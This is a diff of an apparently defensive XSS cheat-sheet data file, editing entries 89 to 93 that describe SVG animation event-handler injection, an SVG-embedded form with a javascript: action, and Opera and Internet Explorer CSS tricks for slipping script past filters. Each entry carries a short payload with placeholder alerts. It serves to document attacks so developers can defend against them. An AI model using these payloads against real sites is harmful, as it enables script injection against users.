@@ -2789,18 +2789,18 @@ var items =
         'tags'       : ['xss', 'svg', 'active', 'xlink', 'opera'],
         'reporter'   : 'LeverOne'
     },
-    { /* ID 89 - SVG events handler injection via animating */
+    { /* ID 89 - SVG event handler injection via "set" and "animate" */
         'id'         : 89,
         'category'   : 'svg', 
         'name'       : {
-            'en' : 'SVG events handler injection via animating',
+            'en' : 'SVG event handler injection via "set" and "animate"',
             'ja' : '',
             'ru' : 'Инъекция обработчика события в SVG с помощью анимирования',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="%js_alert%"/>\n<animate attributeName="onunload" to="%js_alert%"/>\n</svg>',        
         'description': {
-            'en' : 'Google Chrome and Safari support binding an event handler using elements "set" or "animate".',
+            'en' : 'Google Chrome and Safari support binding an event handler using the attributes "set" or "animate". The attribute value is the actually bound event while the "to" attribute value holds the payload.',
             'ja' : '',
             'ru' : 'Google Chrome и Safari поддерживают привязку обработчика события с использованием элементов "set" или "animate".',
             'de' : ''
@@ -2819,11 +2819,11 @@ var items =
         'tags'       : ['xss', 'svg', 'event', 'safari', 'chrome'],
         'reporter'   : 'LeverOne'
     },
-    { /* ID 90 - SVG-image is also a XML-document, but with disabled javascript */
+    { /* ID 90 - SVG images containing XML data - with disabled JavaScript */
         'id'         : 90,
         'category'   : 'css', 
         'name'       : {
-            'en' : 'SVG-image is also a XML-document, but with disabled javascript',
+            'en' : 'SVG images containing XML data - with disabled JavaScript',
             'ja' : '',
             'ru' : 'SVG-изображение это такой же XML-документ, но с выключенным javascript',
             'de' : ''
@@ -2837,7 +2837,7 @@ var items =
             'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%"><input value="XXX" type="submit"/></form>'
         },
         'description': {
-            'en' : 'Opera supports CSS-property "content" inside style attribute. As its value can be specified image object, which replace the html-tag. The same effect occurs when you insert SVG-image through the tag "img".',
+            'en' : 'Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. The same works for SVG files embedded via <IMG> tags.',
             'ja' : '',
             'ru' : 'Opera поддерживает CSS-свойство "content" в стилевом атрибуте. В качестве его значения может быть указан объект, который заместит html-тег. Такой же эффект (а именно вставка ифрейма на страницу) происходит при вставке SVG-изображения через тег "img".',
             'de' : ''
@@ -2850,23 +2850,23 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-	    'opera'  : ['10.x']
+	    'opera'  : ['10.x', '10.5', '10.6']
         },
-        'tags'       : ['xss', 'svg', 'css', 'opera', 'content'],
+        'tags'       : ['xss', 'svg', 'css', 'opera', 'content', 'form'],
         'reporter'   : 'LeverOne'
     },
-    { /* ID 91 - Using "attr()"*/
+    { /* ID 91 - Using "attr()" for CSS attack obfuscation */
         'id'         : 91,
         'category'   : 'css', 
         'name'       : {
-            'en' : 'Using "attr()"',
+            'en' : 'Using "attr()" for CSS attack obfuscation',
             'ja' : '',
             'ru' : 'Использование "attr()"',
             'de' : ''
         },
         'data'       : '<div x="javasc&#x0Aript:%js_alert%" style=-o-link:attr(x);-o-link-source:current>X',        
         'description': {
-            'en' : 'Opera supports "attr()" as an value of the property "-o-link-source". This feature can be used to bypass filters.',
+            'en' : 'Opera supports "attr()" to access attribute values via CSS. Combining that with "-o-link-source" might help bypassing filters.',
             'ja' : '',
             'ru' : 'Opera поддерживает "attr()" в качестве значения свойства "-o-link-source". Эта особенность может быть использована для обхода фильтров.',
             'de' : ''
@@ -2884,18 +2884,18 @@ var items =
         'tags'       : ['xss', 'css', 'opera', 'trick', 'attr'],
         'reporter'   : 'LeverOne, .mario'
     },
-    { /* ID 92 - The trick to breaking the functional notation in IE*/
+    { /* ID 92 - Breaking the functional notation on IE */
         'id'         : 92,
         'category'   : 'css', 
         'name'       : {
-            'en' : 'The trick to breaking the functional notation in IE',
+            'en' : 'Breaking the functional notation on IE ',
             'ja' : '',
             'ru' : 'Способ разорвать функциональную нотацию в IE',
             'de' : ''
         },
-        'data'       : '<!Doctype>\n<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X',        
+        'data'       : '<!DOCTYPE>\n<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X',        
         'description': {
-            'en' : 'As a breaker functional notation "url()" is used any whitespace, followed by any non-whitespace character.',
+            'en' : 'To break the functional notation on IE "url()" can be used combined with a following whitespace - then followed by any non-whitespace character.',
             'ja' : '',
             'ru' : 'В качестве прерывателя функциональной нотации "url()" может быть использована комбинация из любого пробельного символа, за которым следует любой непробельный символ.',
             'de' : ''
@@ -2913,25 +2913,25 @@ var items =
         'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'notation'],
         'reporter'   : 'LeverOne'
     },
-    { /* ID 93 - Multiple "url()" in IE */
+    { /* ID 93 - Multiple CSS "url()" values in IE 6 */
         'id'         : 93,
         'category'   : 'css', 
         'name'       : {
-            'en' : 'Multiple "url()" in IE',
+            'en' : 'Multiple CSS "url()" values in IE 6',
             'ja' : '',
-            'ru' : 'Множественный "url()" в IE',
+            'ru' : 'Множественный "url()" в IE 6',
             'de' : ''
         },
         'data'       : '<div style="list-style:url(http://foo.f)\\20url(%js_uri_alert%);">X',        
         'description': {
-            'en' : 'Intennet Explorer support multiple "url()", which can contain payload. Delimiter "url ()" should be a space character ("\\x20").',
+            'en' : 'Internet Explorer supports multiple "url()" values all of which can contain payload. The delimiter between the "url()" values should be a space character ("\\x20").',
             'ja' : '',
             'ru' : 'IE поддерживает множественный "url()", который может содержать "полезную нагрузку". Разделителем "url()" может быть только символ пробела (\\x20).',
             'de' : ''
         },
         'urls'    : [],
         'howtofix'   : {
-            'en' : '',
+            'en' : 'Make sure in case the user is allowed to submit CSS it is being filtered and whitelisted correctly to avoid attacks via multiple backgrounds.',
             'ja' : '',
             'ru' : '',
             'de' : ''
